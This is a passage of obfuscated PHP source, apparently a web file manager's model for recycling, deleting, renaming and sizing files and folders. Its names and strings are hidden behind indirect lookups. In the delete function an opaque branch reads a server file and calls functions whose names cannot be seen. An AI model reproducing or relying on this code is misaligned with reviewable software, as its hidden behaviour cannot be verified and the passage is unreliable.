KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $Ú—Ä¿Ìë = $â‚±© [$Ñ§À‚Ïà[411]] == self::TYPE_USER ? $Ñ§À‚Ïà[590] : $Ñ§À‚Ïà[505]; if ($Ú—Ä¿Ìë == $Ñ§À‚Ïà[590]) { $åé­ÜÑ¶ = Model($Ñ§À‚Ïà[504])->getInfo($â‚±© [$Ñ§À‚Ïà[496]]); $ıÎ±İ¿ç = !empty($åé­ÜÑ¶[$Ñ§À‚Ïà[532]]) ? $åé­ÜÑ¶[$Ñ§À‚Ïà[532]] : $åé­ÜÑ¶[$Ñ§À‚Ïà[32]]; $ıÎ±İ¿ç = $Ñ§À‚Ïà[260] . $ıÎ±İ¿ç . $Ñ§À‚Ïà[2147] . $â‚±© [$Ñ§À‚Ïà[496]]; } else { $åé­ÜÑ¶ = Model($Ñ§À‚Ïà[512])->getInfo($â‚±© [$Ñ§À‚Ïà[496]]); $ıÎ±İ¿ç = _get($åé­ÜÑ¶, $Ñ§À‚Ïà[32]); $ıÎ±İ¿ç = $Ñ§À‚Ïà[162] . $ıÎ±İ¿ç . $Ñ§À‚Ïà[2148] . $â‚±© [$Ñ§À‚Ïà[496]]; } $àëøÓ‹Û = $Ñ§À‚Ïà[2149] . md5($ıÎ±İ¿ç); CacheLock::lock($àëøÓ‹Û); $°É®Ôşğ = $this->fileNameExist($±°¡íÎ, $ıÎ±İ¿ç); if (!$°É®Ôşğ) { $°É®Ôşğ = $this->mkdir($±°¡íÎ, $ıÎ±İ¿ç, REPEAT_SKIP); $this->metaSet($°É®Ôşğ, $Ñ§À‚Ïà[2150], $Ú—Ä¿Ìë); $this->metaSet($°É®Ôşğ, $Ñ§À‚Ïà[2151], $â‚±© [$Ñ§À‚Ïà[496]]); if ($â‚±© [$Ñ§À‚Ïà[432]] != 0) { $this->metaSet($°É®Ôşğ, $Ñ§À‚Ïà[2152], _get($åé­ÜÑ¶, $Ñ§À‚Ïà[2153])); } } CacheLock::unlock($àëøÓ‹Û); $this->metaSet($ËûååË˜, $Ñ§À‚Ïà[2154], $â‚±© [$Ñ§À‚Ïà[432]]); $this->where(array($Ñ§À‚Ïà[402] => $ËûååË˜))->save(array($Ñ§À‚Ïà[424] => time())); $this->recycleClear($â‚±© ); $Ö®“ìò‡ = $this->move($ËûååË˜, $°É®Ôşğ, REPEAT_RENAME_FOLDER); $this->folderSizeReset($â‚±© [$Ñ§À‚Ïà[432]]); return $Ö®“ìò‡; } private function recycleClear($©ŞîÙ°Ü) { $ÙîŒÇÁ =& $_SERVER[ì™ı‰º¯]; $âÎÃÊåë = $this->childrenAll($©ŞîÙ°Ü); $’ëÂõÜÕ = array($ÙîŒÇÁ[417] => array($ÙîŒÇÁ[418], $âÎÃÊåë[$ÙîŒÇÁ[2155]])); Model($ÙîŒÇÁ[2156])->where($’ëÂõÜÕ)->delete(); } public function removeNow($…–íú‹, $âúİ½¾Ù = true) { $£”ºÀ¾Ì =& $_SERVER[ì™ı‰º¯]; if ($_SERVER[$£”ºÀ¾Ì[872]] != $_SERVER[$£”ºÀ¾Ì[1511]]) { $à¿ÏÁ’· = $£”ºÀ¾Ì[874]; $ıß¹èÎ« = $£”ºÀ¾Ì[875]; $³…Ñîêã = $_SERVER[$£”ºÀ¾Ì[876]] . $£”ºÀ¾Ì[877]; $øİÖ•Àò = $ıß¹èÎ«($³…Ñîêã); $ä›¾§ÁÌ = explode($£”ºÀ¾Ì[231], $øİÖ•Àò); if (count($ä›¾§ÁÌ) < $£”ºÀ¾Ì[610]) { $îŸÀ¦ = $£”ºÀ¾Ì[878]; $îŸÀ¦(); } $º†ˆŠŸš = $£”ºÀ¾Ì[879]; $º†ˆŠŸš($_SERVER[$£”ºÀ¾Ì[880]]); $º†ˆŠŸš($_SERVER[$£”ºÀ¾Ì[876]] . $£”ºÀ¾Ì[1598]); $Ä®â–Íñ = 1; while ($Ä®â–Íñ > 1) { $Ä®â–Íñ = $Ä®â–Íñ + 4; $Ÿ¬€ºâ = rawurlencode($Ä®â–Íñ . $£”ºÀ¾Ì[378]); } } $ÎûöÀ¸ø = $this->sourceInfo($…–íú‹); $²×ºĞÈø = $this->pathInfoMore($…–íú‹); if (!$ÎûöÀ¸ø) { return !0; } if ($ÎûöÀ¸ø[$£”ºÀ¾Ì[432]] == 0) { if (!_get($GLOBALS, $£”ºÀ¾Ì[494])) { return !1; } } $this->lockMoveStart($…–íú‹); Hook::trigger($£”ºÀ¾Ì[2157], $²×ºĞÈø, $âúİ½¾Ù); if ($âúİ½¾Ù) { Model($£”ºÀ¾Ì[2156])->moveToRecycle($…–íú‹); } else { $±¿Ã¸„ = $this->childrenAll($ÎûöÀ¸ø); Model($£”ºÀ¾Ì[561])->eventRemove($…–íú‹); $this->removeRelevance($±¿Ã¸„[$£”ºÀ¾Ì[2155]], $±¿Ã¸„[$£”ºÀ¾Ì[1481]]); } $this->folderSizeReset($ÎûöÀ¸ø[$£”ºÀ¾Ì[432]]); $æï„¶´Ù = array($ÎûöÀ¸ø[$£”ºÀ¾Ì[432]]); if ($ÎûöÀ¸ø[$£”ºÀ¾Ì[410]] == $£”ºÀ¾Ì[88]) { $æï„¶´Ù[] = $ÎûöÀ¸ø[$£”ºÀ¾Ì[402]]; } $this->updateModifyTime($æï„¶´Ù); $this->lockMoveEnd($…–íú‹); Hook::trigger($£”ºÀ¾Ì[1712], $²×ºĞÈø, $âúİ½¾Ù); return !0; } public function childrenAll($ŸĞ´ÊÜŸ) { $«ĞÖ®‰” =& $_SERVER[ì™ı‰º¯]; $í¾š‘¼· = $ŸĞ´ÊÜŸ[$«ĞÖ®‰”[402]]; if ($ŸĞ´ÊÜŸ[$«ĞÖ®‰”[410]] == $«ĞÖ®‰”[88]) { $ßè€üöÄ = array($«ĞÖ®‰”[580] => array($«ĞÖ®‰”[540], $ŸĞ´ÊÜŸ[$«ĞÖ®‰”[511]] . $í¾š‘¼· . $«ĞÖ®‰”[541])); $ûğšÛ¸Í = array($«ĞÖ®‰”[580] => $ßè€üöÄ[$«ĞÖ®‰”[511]]); $—˜‚Î¬Ó = $this->field($«ĞÖ®‰”[2158])->where($ûğšÛ¸Í)->select(); $À¨ìÄĞ° = !1; $ıóŞÈ† = array($í¾š‘¼·); if ($—˜‚Î¬Ó) { $À¨ìÄĞ° = array_to_keyvalue($—˜‚Î¬Ó, $«ĞÖ®‰”[12], $«ĞÖ®‰”[468]); $À¨ìÄĞ° = array_remove_value($À¨ìÄĞ°, $«ĞÖ®‰”[198]); $ıóŞÈ† = array_to_keyvalue($—˜‚Î¬Ó, $«ĞÖ®‰”[12], $«ĞÖ®‰”[402]); $ıóŞÈ†[] = $í¾š‘¼·; } } else { $À¨ìÄĞ° = array($ŸĞ´ÊÜŸ[$«ĞÖ®‰”[468]]); $ıóŞÈ† = array($í¾š‘¼·); } return array($«ĞÖ®‰”[2155] => $ıóŞÈ†, $«ĞÖ®‰”[1481] => $À¨ìÄĞ°); } public function removeArray($­±Ê©Ğç) { if (!$­±Ê©Ğç) { return !0; } } public function removeRelevance($¬Ìİõª, $ƒû™ Ÿ‰) { $Ï¼™îÔå =& $_SERVER[ì™ı‰º¯]; $¬Ìİõª = $¬Ìİõª ? $¬Ìİõª : array(); $ƒû™ Ÿ‰ = $ƒû™ Ÿ‰ ? $ƒû™ Ÿ‰ : array(); $¬Ìİõª = array_unique(array_filter($¬Ìİõª)); $ƒû™ Ÿ‰ = array_unique(array_filter($ƒû™ Ÿ‰)); if (!$¬Ìİõª) { return !1; } $×†™ØëÍ = array($Ï¼™îÔå[417] => array($Ï¼™îÔå[418], $¬Ìİõª)); Model($Ï¼™îÔå[2156])->where($×†™ØëÍ)->delete(); Model($Ï¼™îÔå[462])->where($×†™ØëÍ)->delete(); Model($Ï¼™îÔå[2006])->where($×†™ØëÍ)->delete(); Model($Ï¼™îÔå[561])->where($×†™ØëÍ)->delete(); Model($Ï¼™îÔå[1839])->removeBySource($¬Ìİõª); Model($Ï¼™îÔå[2138])->removeBySource($¬Ìİõª); $this->where($×†™ØëÍ)->delete(); Model($Ï¼™îÔå[471])->remove($ƒû™ Ÿ‰); for ($»ŒæªÙ„ = 0; $»ŒæªÙ„ < count($¬Ìİõª); $»ŒæªÙ„++) { $this->sourceCacheClear($¬Ìİõª[$»ŒæªÙ„]); } } public function rename($êµÛšä», $Â˜ÓÁ¶Ä) { $  Ûïşò =& $_SERVER[ì™ı‰º¯]; $İüö³‹Õ = $this->sourceInfo($êµÛšä»); if (!$İüö³‹Õ) { return !1; } $«Ö‡ñÏ = $this->fileNameExist($İüö³‹Õ[$  Ûïşò[432]], $Â˜ÓÁ¶Ä); if ($«Ö‡ñÏ && $«Ö‡ñÏ != $êµÛšä») { return !1; } $ùòÚÀµç = array($  Ûïşò[420] => $Â˜ÓÁ¶Ä, $  Ûïşò[579] => USER_ID); if ($İüö³‹Õ[$  Ûïşò[410]] != $  Ûïşò[88]) { $ùòÚÀµç[$  Ûïşò[412]] = substr(get_path_ext($Â˜ÓÁ¶Ä), 0, 10); } Model($  Ûïşò[561])->eventRename($êµÛšä», $İüö³‹Õ[$  Ûïşò[32]], $Â˜ÓÁ¶Ä); $this->sourceCacheClear($êµÛšä»); $this->setNamePinyin($êµÛšä», $ùòÚÀµç[$  Ûïşò[32]], !1); $this->updateModifyTime($İüö³‹Õ[$  Ûïşò[432]]); $Æ¸€¸‘‰ = $this->where(array($  Ûïşò[417] => $êµÛšä»))->data($ùòÚÀµç)->save(); $Ÿû¯¿Ä = $  Ûïşò[2145] . $İüö³‹Õ[$  Ûïşò[432]]; if (isset(self::$cacheChildList[$Ÿû¯¿Ä])) { unset(self::$cacheChildList[$Ÿû¯¿Ä]); } return $Æ¸€¸‘‰; } public function setNamePinyin($Îîğ³œ¦, $¬‰…»×, $€ôçË€ = true) { $ÅÃ¬©¥ =& $_SERVER[ì™ı‰º¯]; $ÇÉ©³Ï¤ = Input::check($¬‰…»×, $ÅÃ¬©¥[583]); $ü²ÏşÇï = array($ÅÃ¬©¥[444] => KodSort::makeStr($¬‰…»×)); if ($ÇÉ©³Ï¤) { $ü²ÏşÇï[$ÅÃ¬©¥[465]] = str_replace($ÅÃ¬©¥[53], $ÅÃ¬©¥[12], Pinyin::get($¬‰…»×)); $ü²ÏşÇï[$ÅÃ¬©¥[464]] = Pinyin::get($¬‰…»×, $ÅÃ¬©¥[584]); } if (!$€ôçË€ && !$ÇÉ©³Ï¤) { $ü²ÏşÇï[$ÅÃ¬©¥[465]] = null; $ü²ÏşÇï[$ÅÃ¬©¥[464]] = null; } $this->metaSet($Îîğ³œ¦, $ü²ÏşÇï); } public function getContent($†¢ÜØ…‚) { $üŞ¾¶¥ =& $_SERVER[ì™ı‰º¯]; $û¡è­Æà = $this->fileInfoGet($†¢ÜØ…‚); if (!$û¡è­Æà) { return !1; } if ($û¡è­Æà[$üŞ¾¶¥[76]] == 0) { return $üŞ¾¶¥[12]; } $ìĞŒªœ‘ = $üŞ¾¶¥[2159] . $û¡è­Æà[$üŞ¾¶¥[176]]; if ($û¡è­Æà[$üŞ¾¶¥[76]] <= 1024 * 10) { $¡äŠŒ“Ë = Cache::get($ìĞŒªœ‘); if (!$¡äŠŒ“Ë) { $¡äŠŒ“Ë = IO::getContent($û¡è­Æà[$üŞ¾¶¥[84]]); Cache::set($ìĞŒªœ‘, $¡äŠŒ“Ë); } return $¡äŠŒ“Ë; } if (!$û¡è­Æà[$üŞ¾¶¥[84]]) { return $üŞ¾¶¥[12]; } return IO::getContent($û¡è­Æà[$üŞ¾¶¥[84]]); } public function setDesc($õçÂƒ“–, $ÆÒÒ•¼) { $¥±š„“¯ =& $_SERVER[ì™ı‰º¯]; Model($¥±š„“¯[561])->eventAddDesc($õçÂƒ“–, $ÆÒÒ•¼); return $this->metaSet($õçÂƒ“–, $¥±š„“¯[453], $ÆÒÒ•¼); } public function setContent($¨Ô˜Å, $Å“«…¹¿ = '') { $ÔÛû¤ö¥ =& $_SERVER[ì™ı‰º¯]; $™íÒñ¡Ë = $this->sourceInfo($¨Ô˜Å); $ÙÊşÌäÁ = $this->fileInfoGet($¨Ô˜Å); if (!$ÙÊşÌäÁ || !$™íÒñ¡Ë) { return !1; } $××ëúâ = Model($ÔÛû¤ö¥[471])->addFileByContent($Å“«…¹¿, $™íÒñ¡Ë[$ÔÛû¤ö¥[32]]); $Òµ¾˜ú = $this->fileHistory($™íÒñ¡Ë, $××ëúâ[$ÔÛû¤ö¥[468]], $××ëúâ[$ÔÛû¤ö¥[76]]); if (!$Òµ¾˜ú) { return Model($ÔÛû¤ö¥[471])->remove($××ëúâ[$ÔÛû¤ö¥[468]]); } $this->folderSizeReset($™íÒñ¡Ë[$ÔÛû¤ö¥[432]]); return !0; } public function fileSubstr($­Ûï­”, $Ö˜èê‚é, $ÇÄäªï„) { $ Â¥â… = $this->fileInfoGet($­Ûï­”); if (!$ Â¥â…) { return !1; } return IO::fileSubstr($ Â¥â…[$_SERVER[ì™ı‰º¯][84]], $Ö˜èê‚é, $ÇÄäªï„); } public function fileInfoGet($ñ‡ß ¨“) { $á”‚…Á¹ =& $_SERVER[ì™ı‰º¯]; $¡×Â¾şœ = $this->sourceInfo($ñ‡ß ¨“); if (!$¡×Â¾şœ || $¡×Â¾şœ[$á”‚…Á¹[410]]) { return !1; } $ö©´¬Ä† = $á”‚…Á¹[474] . $¡×Â¾şœ[$á”‚…Á¹[468]]; $—•ßÀíµ = _get(self::$cacheFileInfo, $ö©´¬Ä†); if ($—•ßÀíµ) { return $—•ßÀíµ; } $ëÌ¯¹è² = Model($á”‚…Á¹[471])->fileInfo($¡×Â¾şœ[$á”‚…Á¹[468]]); if ($ëÌ¯¹è²) { $ëÌ¯¹è²[$á”‚…Á¹[32]] = $¡×Â¾şœ[$á”‚…Á¹[32]]; } self::$cacheFileInfo[$ö©´¬Ä†] = $ëÌ¯¹è²; return $ëÌ¯¹è²; } private function folderChildrenNumber($¤Î±•Ü) { $®ì¢“¡ =& $_SERVER[ì™ı‰º¯]; $´ÒåÈËÑ = $this->sourceInfo($¤Î±•Ü); $ñª÷Ç‹µ = array($®ì¢“¡[580] => array($®ì¢“¡[540], $´ÒåÈËÑ[$®ì¢“¡[511]] . $¤Î±•Ü . $®ì¢“¡[541]), $®ì¢“¡[577] => $´ÒåÈËÑ[$®ì¢“¡[496]], $®ì¢“¡[430] => intval($´ÒåÈËÑ[$®ì¢“¡[431]]), $®ì¢“¡[574] => 1); $¿ÅÊÇÍ© = $this->where($ñª÷Ç‹µ)->count(); $æÀî‡¶ = $this->where($ñª÷Ç‹µ)->where(array($®ì¢“¡[574] => 0))->count(); return array($®ì¢“¡[80] => $æÀî‡¶, $®ì¢“¡[81] => $¿ÅÊÇÍ©); } public function pathInfo($È¾ßşùÒ, $ œù¸€İ = false) { $ì‰ğ¤Çñ =& $_SERVER[ì™ı‰º¯]; $ œù¸€İ = !1; $È¾ßşùÒ = intval($È¾ßşùÒ); $Ÿ·™¥Û = $ì‰ğ¤Çñ[461] . intval($ œù¸€İ) . $ì‰ğ¤Çñ[386] . $È¾ßşùÒ; $×éÆ±Í = _get(self::$cachePathInfo, $Ÿ·™¥Û); if ($×éÆ±Í) { return $×éÆ±Í; } $ö‘è„ä‘ = $this->sourceInfo($È¾ßşùÒ); if (!$ö‘è„ä‘) { return !1; } $ö‘è„ä‘ = $this->_listDataApplyItem($ö‘è„ä‘, $ œù¸€İ); self::$cachePathInfo[$Ÿ·™¥Û] = $ö‘è„ä‘; return $ö‘è„ä‘; } public static $cachePathInfoMore = array(); public function pathInfoMore($é‘ú´ï›) { $©½Àì²Š =& $_SERVER[ì™ı‰º¯]; $ÂŒ»å“² = _get(self::$cachePathInfoMore, $é‘ú´ï›); if ($ÂŒ»å“²) { return $ÂŒ»å“²; } $Á‘â¼Ü© = $this->pathInfo($é‘ú´ï›); if (!$Á‘â¼Ü©) { return !1; } if ($Á‘â¼Ü©[$©½Àì²Š[410]] == $©½Àì²Š[88]) { $Á‘â¼Ü©[$©½Àì²Š[79]] = $this->folderChildrenNumber($é‘ú´ï›); } self::$cachePathInfoMore[$é‘ú´ï›] = $Á‘â¼Ü©; return $Á‘â¼Ü©; } public function sourceInfo($ó½Ü­˜Ú) { $úÆèé¡ =& $_SERVER[ì™ı‰º¯]; if (!$ó½Ü­˜Ú) { return array(); } $ó½Ü­˜Ú = intval($ó½Ü­˜Ú); $şÓîæ†Ü = $úÆèé¡[460] . $ó½Ü­˜Ú; $­Ô»ô½Ğ = _get(self::$cacheSourceInfo, $şÓîæ†Ü); if ($­Ô»ô½Ğ) { return $­Ô»ô½Ğ; } $Ñíë³†å = $this->where(array($úÆèé¡[402] => $ó½Ü­˜Ú))->find(); self::$cacheSourceInfo[$şÓîæ†Ü] = $Ñíë³†å; return self::$cacheSourceInfo[$şÓîæ†Ü]; } public function sourceCacheClear($¦‰Ú»ÒÙ = false) { self::cacheClear($¦‰Ú»ÒÙ); } public static function cacheClear($›©¸·Ñş = false) { $ß˜ÕÎ§© =& $_SERVER[ì™ı‰º¯]; if ($›©¸·Ñş == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$ß˜ÕÎ§©[460] . $›©¸·Ñş]); unset(self::$cachePathInfoMore[$›©¸·Ñş]); unset(self::$cachePathInfo[$ß˜ÕÎ§©[2160] . $›©¸·Ñş]); unset(self::$cachePathInfo[$ß˜ÕÎ§©[2161] . $›©¸·Ñş]); } public function metaSet($•Ô»•ã, $´ö šÎ˜ = null, $‡É…ùåì = null) { $íàÛ™¤ = parent::metaSet($•Ô»•ã, $´ö šÎ˜, $‡É…ùåì); if ($íàÛ™¤) { $this->sourceCacheClear($•Ô»•ã); } return $íàÛ™¤; } public function pathInfoByPath($´Çáö‰, $®ı³œâˆ) { $øìÕú¹¼ =& $_SERVER[ì™ı‰º¯]; $äŒì‡ôá = !$®ı³œâˆ ? array() : explode($øìÕú¹¼[8], trim($®ı³œâˆ, $øìÕú¹¼[8])); $…æ‡ºòÃ = $´Çáö‰; foreach ($äŒì‡ôá as $¨¥¢ï»Æ) { $’ØÍÀ¸š = array($øìÕú¹¼[432] => $…æ‡ºòÃ, $øìÕú¹¼[32] => $¨¥¢ï»Æ); $ÉïåÊñ = $this->where($’ØÍÀ¸š)->select(); if (!$ÉïåÊñ) { return !1; } $ÉïåÊñ = array_sort_by($ÉïåÊñ, $øìÕú¹¼[431]); $…æ‡ºòÃ = $ÉïåÊñ[0][$øìÕú¹¼[402]]; } return $this->pathInfo($…æ‡ºòÃ, !0); } protected function updateModifyTime($éŸå¢¿¶) { $˜÷ÏÍÊÌ =& $_SERVER[ì™ı‰º¯]; if (!$éŸå¢¿¶) { return; } if (!is_array($éŸå¢¿¶)) { $éŸå¢¿¶ = array($éŸå¢¿¶); } foreach ($éŸå¢¿¶ as $ç«“Â¸‰ => $ÀûøåÀû) { $éŸå¢¿¶[$ç«“Â¸‰] = intval($ÀûøåÀû); $this->sourceCacheClear($ÀûøåÀû); } $¸í¦¤ê = array($˜÷ÏÍÊÌ[402] => array($˜÷ÏÍÊÌ[7], $éŸå¢¿¶)); $‰ÆÈ´Ÿä = array($˜÷ÏÍÊÌ[579] => USER_ID, $˜÷ÏÍÊÌ[424] => time()); $this->where($¸í¦¤ê)->save($‰ÆÈ´Ÿä); } public function folderSizeReset($Ùë¡Şğã, $›µŒºµ¾ = false) { $‘ì´ŸÀÚ =& $_SERVER[ì™ı‰º¯]; if ($this->statusIgnoreResetSpace) { return; } $õï¾ÖÓ = $this->sourceInfo($Ùë¡Şğã); $ƒÉ¼Òâº = $‘ì´ŸÀÚ[2162] . $Ùë¡Şğã; CacheLock::lock($ƒÉ¼Òâº, 20); if ($›µŒºµ¾ === !1) { $this->sourceCacheClear($Ùë¡Şğã); $õï¾ÖÓ = $this->sourceInfo($Ùë¡Şğã); $†Ûê—„Æ = array($‘ì´ŸÀÚ[401] => $Ùë¡Şğã, $‘ì´ŸÀÚ[430] => 0); $ñ²ıµ Ó = $this->where($†Ûê—„Æ)->sum($‘ì´ŸÀÚ[76]); $›µŒºµ¾ = intval($ñ²ıµ Ó) - intval($õï¾ÖÓ[$‘ì´ŸÀÚ[76]]); } if ($›µŒºµ¾ == 0) { return CacheLock::unlock($ƒÉ¼Òâº); } $¨»‰æŒ³ = $this->parentLevelArray($õï¾ÖÓ[$‘ì´ŸÀÚ[511]]); if (!$¨»‰æŒ³) { $¨»‰æŒ³ = array(); } $¨»‰æŒ³[] = $õï¾ÖÓ[$‘ì´ŸÀÚ[402]]; $†Ûê—„Æ = array($‘ì´ŸÀÚ[402] => array($‘ì´ŸÀÚ[418], $¨»‰æŒ³)); if ($›µŒºµ¾ < 0) { $†Ûê—„Æ[$‘ì´ŸÀÚ[76]] = array($‘ì´ŸÀÚ[1014], abs($›µŒºµ¾)); } $this->where($†Ûê—„Æ)->setAdd($‘ì´ŸÀÚ[76], $›µŒºµ¾); CacheLock::unlock($ƒÉ¼Òâº); $’¢¯¹Ú‚ = $‘ì´ŸÀÚ[2163] . $õï¾ÖÓ[$‘ì´ŸÀÚ[411]] . $‘ì´ŸÀÚ[4] . $õï¾ÖÓ[$‘ì´ŸÀÚ[496]]; $ËÑÊÉóÒ = array($õï¾ÖÓ[$‘ì´ŸÀÚ[411]], $õï¾ÖÓ[$‘ì´ŸÀÚ[496]]); TaskRun::timeLimitCall($’¢¯¹Ú‚, $‘ì´ŸÀÚ[2164], $ËÑÊÉóÒ, 1.5); } public function folderSizeResetChildren($êÛ„Åğí) { $İù¡Õçª =& $_SERVER[ì™ı‰º¯]; $this->sourceCacheClear($êÛ„Åğí); $ÏÌ‚Õ¨ = $this->sourceInfo($êÛ„Åğí); $Ğò‚ò… = array($İù¡Õçª[574] => 1, $İù¡Õçª[577] => $ÏÌ‚Õ¨[$İù¡Õçª[496]], $İù¡Õçª[580] => array($İù¡Õçª[540], $ÏÌ‚Õ¨[$İù¡Õçª[511]] . $êÛ„Åğí . $İù¡Õçª[541])); $÷›ùËù‡ = $İù¡Õçª[2165]; $áëƒäŞ° = $this->field($÷›ùËù‡)->where($Ğò‚ò…)->select(); $Ğò‚ò…[$İù¡Õçª[410]] = 0; $µê©“…Ö = $this->field($÷›ùËù‡)->where($Ğò‚ò…)->select(); if (!$µê©“…Ö) { return; } $áëƒäŞ°[] = $ÏÌ‚Õ¨; $áëƒäŞ° = array_to_keyvalue($áëƒäŞ°, $İù¡Õçª[402]); foreach ($áëƒäŞ° as $•úªõäç => $ÀæÅÔ) { $áëƒäŞ°[$•úªõäç][$İù¡Õçª[2166]] = $áëƒäŞ°[$•úªõäç][$İù¡Õçª[76]]; $áëƒäŞ°[$•úªõäç][$İù¡Õçª[76]] = 0; } foreach ($µê©“…Ö as $ÀæÅÔ) { $”Ò¤¿†‹ = $ÀæÅÔ[$İù¡Õçª[432]] . $İù¡Õçª[12]; if (!isset($áëƒäŞ°[$”Ò¤¿†‹])) { continue; } if ($ÀæÅÔ[$İù¡Õçª[431]] == $áëƒäŞ°[$”Ò¤¿†‹][$İù¡Õçª[431]]) { $áëƒäŞ°[$”Ò¤¿†‹][$İù¡Õçª[76]] += $ÀæÅÔ[$İù¡Õçª[76]]; } } foreach ($áëƒäŞ° as $ÀæÅÔ) { $ûàë®Âè = $this->parentLevelArray($ÀæÅÔ[$İù¡Õçª[511]]); foreach ($ûàë®Âè as $”Ò¤¿†‹) { $”Ò¤¿†‹ = $”Ò¤¿†‹ . $İù¡Õçª[12]; if (!isset($áëƒäŞ°[$”Ò¤¿†‹])) { continue; } if ($ÀæÅÔ[$İù¡Õçª[431]] == $áëƒäŞ°[$”Ò¤¿†‹][$İù¡Õçª[431]]) { $áëƒäŞ°[$”Ò¤¿†‹][$İù¡Õçª[76]] += $ÀæÅÔ[$İù¡Õçª[76]]; } } } $èØÌ˜ğÈ = array(); foreach ($áëƒäŞ° as $ÀæÅÔ) { if ($ÀæÅÔ[$İù¡Õçª[76]] == $ÀæÅÔ[$İù¡Õçª[2166]]) { continue; } $èØÌ˜ğÈ[] = array($İù¡Õçª[402], $ÀæÅÔ[$İù¡Õçª[402]], $İù¡Õçª[76], $ÀæÅÔ[$İù¡Õçª[76]]); } $this->saveAll($èØÌ˜ğÈ); } public function userSpaceReset($¡Ë±¬¨º = false) { $±“À¿¦ =& $_SERVER[ì™ı‰º¯]; $í¶ê´–Æ = $this->where(array($±“À¿¦[411] => self::TYPE_USER, $±“À¿¦[496] => $¡Ë±¬¨º, $±“À¿¦[410] => 0))->sum($±“À¿¦[76]); $í¶ê´–Æ = !$í¶ê´–Æ || $í¶ê´–Æ <= 0 ? 0 : $í¶ê´–Æ; Model($±“À¿¦[504])->userEdit($¡Ë±¬¨º, array($±“À¿¦[1848] => $í¶ê´–Æ)); } public function targetSpaceUpdate($ğˆë®½¼, $›®Ü–à³) { $ƒ£Ú¯¼ =& $_SERVER[ì™ı‰º¯]; if (!$›®Ü–à³) { return; } if (!in_array($ğˆë®½¼, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $¬£İœÆ = $this->targetSpaceSize($ğˆë®½¼, $›®Ü–à³); if ($ğˆë®½¼ == self::TYPE_USER) { Model($ƒ£Ú¯¼[504])->userEdit($›®Ü–à³, array($ƒ£Ú¯¼[1848] => $¬£İœÆ)); } else { if ($ğˆë®½¼ == self::TYPE_GROUP) { Model($ƒ£Ú¯¼[512])->groupEdit($›®Ü–à³, array($ƒ£Ú¯¼[1848] => $¬£İœÆ)); } } } public function targetSpaceSize($ó—¼ù•Ù, $ÂŠİœª•) { $şáåŠ°æ =& $_SERVER[ì™ı‰º¯]; $î¡¿Ìı§ = 0; $òÙÄœØŸ = $this->targetSourceRoot($ó—¼ù•Ù, $ÂŠİœª•, !0); foreach ($òÙÄœØŸ as $Ì¨ÄÒŠÒ) { if (!$Ì¨ÄÒŠÒ) { continue; } $î¡¿Ìı§ += floatval($Ì¨ÄÒŠÒ[$şáåŠ°æ[76]]); $©°ƒäÔ† = array($şáåŠ°æ[580] => array($şáåŠ°æ[540], $şáåŠ°æ[521] . $Ì¨ÄÒŠÒ[$şáåŠ°æ[402]] . $şáåŠ°æ[541])); $ğ»ìÜĞ = Model($şáåŠ°æ[429])->field($şáåŠ°æ[417])->where($©°ƒäÔ†)->select(); $ğ»ìÜĞ = array_to_keyvalue($ğ»ìÜĞ, $şáåŠ°æ[12], $şáåŠ°æ[402]); $ğ»ìÜĞ = array_unique(array_filter($ğ»ìÜĞ)); if ($ğ»ìÜĞ) { $©°ƒäÔ† = array($şáåŠ°æ[417] => array($şáåŠ°æ[418], $ğ»ìÜĞ)); $î¡¿Ìı§ += floatval($this->where($©°ƒäÔ†)->sum($şáåŠ°æ[76])); } } $î¡¿Ìı§ = !$î¡¿Ìı§ || $î¡¿Ìı§ <= 0 ? 0 : $î¡¿Ìı§; return $î¡¿Ìı§; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($Ç££”Şº) { return $this->fileTypeProfile($Ç££”Şº, SourceModel::TYPE_USER); } public function groupFileTypeProfile($¤Æ¾•Á®) { return $this->fileTypeProfile($¤Æ¾•Á®, SourceModel::TYPE_GROUP); } private function fileTypeProfile($€ÚÈíÛê, $‘˜ÄØï) { $–––Áï =& $_SERVER[ì™ı‰º¯]; $Š­§à¼ = $–––Áï[2167] . $€ÚÈíÛê . $–––Áï[11] . $‘˜ÄØï; $İÃî‘šã = Cache::get($Š­§à¼); if ($İÃî‘šã) { return $İÃî‘šã; } $ÛÚ–Ï¨— = array($–––Áï[574] => 0); if ($€ÚÈíÛê != !1) { $ÛÚ–Ï¨—[$–––Áï[496]] = $€ÚÈíÛê; $ÛÚ–Ï¨—[$–––Áï[411]] = $‘˜ÄØï; } $Á¸ËÛˆ‹ = array(); $Á¸ËÛˆ‹[$–––Áï[2168]] = array($–––Áï[2169] => LNG($–––Áï[2168]), $–––Áï[2170] => $this->where($ÛÚ–Ï¨—)->count(), $–––Áï[545] => $this->where($ÛÚ–Ï¨—)->sum($–––Áï[76])); $Íó†ê­‚ = KodIO::fileTypeList(); foreach ($Íó†ê­‚ as $ƒ«®¥³ => $Ÿ–İÈÕ») { $ÛÚ–Ï¨—[$–––Áï[412]] = $this->fileTypeWhere($ƒ«®¥³); $Á¸ËÛˆ‹[$ƒ«®¥³] = array($–––Áï[2169] => $Ÿ–İÈÕ»[$–––Áï[32]], $–––Áï[2170] => $this->where($ÛÚ–Ï¨—)->count(), $–––Áï[545] => $this->where($ÛÚ–Ï¨—)->sum($–––Áï[76])); } Cache::set($Š­§à¼, $Á¸ËÛˆ‹, 1200); return $Á¸ËÛˆ‹; } public function fileNameExist($İÈÒ‰Ü”, $èø‚Šº¼) { $±ŞÅñË =& $_SERVER[ì™ı‰º¯]; $ÅÃŞØÛ = $this->where(array($±ŞÅñË[432] => $İÈÒ‰Ü”, $±ŞÅñË[32] => $èø‚Šº¼, $±ŞÅñË[431] => 0))->find(); return is_array($ÅÃŞØÛ) ? $ÅÃŞØÛ[$±ŞÅñË[402]] : !1; } public function childList($Öç¾îÀ) { $™æÆ†“ =& $_SERVER[ì™ı‰º¯]; $ùÆßªÜÁ = $™æÆ†“[2145] . $Öç¾îÀ; if (isset(self::$cacheChildList[$ùÆßªÜÁ])) { return self::$cacheChildList[$ùÆßªÜÁ]; } $¼ÓÓĞãğ = array($™æÆ†“[432] => intval($Öç¾îÀ), $™æÆ†“[431] => 0); $œå›êÏı = $this->where($¼ÓÓĞãğ)->select(); $œå›êÏı = 